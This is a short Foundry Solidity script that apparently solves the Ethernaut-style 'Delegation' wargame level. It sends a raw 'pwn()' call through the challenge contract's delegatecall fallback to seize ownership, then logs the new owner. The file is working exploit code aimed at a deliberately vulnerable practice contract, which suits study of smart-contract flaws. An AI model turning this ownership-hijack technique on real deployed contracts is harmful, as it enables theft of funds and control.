// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Delegation } from "../src/06_Delegation.sol";

contract DelegationAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address challengeInstanceAddress = helperConfig.instances("Delegation");
    Delegation challenge = Delegation(challengeInstanceAddress);

    vm.startBroadcast(deployerPrivateKey);
    (bool success, ) = address(challenge).call(abi.encodeWithSignature("pwn()"));
    require(success, "pwn call failed");
    
    console.log("challenge.owner(): %s", challenge.owner());
    vm.stopBroadcast();
  }

}